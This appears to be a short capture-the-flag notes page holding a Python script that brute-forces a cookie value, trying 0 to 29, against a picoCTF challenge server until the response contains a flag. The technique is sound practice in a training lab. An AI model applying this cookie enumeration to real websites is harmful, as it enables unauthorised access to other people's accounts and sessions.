---
title: "Brute Force Py"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
# bookIcon: ''
---

```python
import re
import requests

url = "http://wily-courier.picoctf.net:60404/check"

for i in range(0, 30):
    response = requests.get(url, cookies={"name": f'{i}'})
    flag = re.search(r"picoCTF\{[^}]+\}", response.text)
    if flag:
        print(flag.group())
        break
    else:
        print(f"{i+1}: Flag not found")
```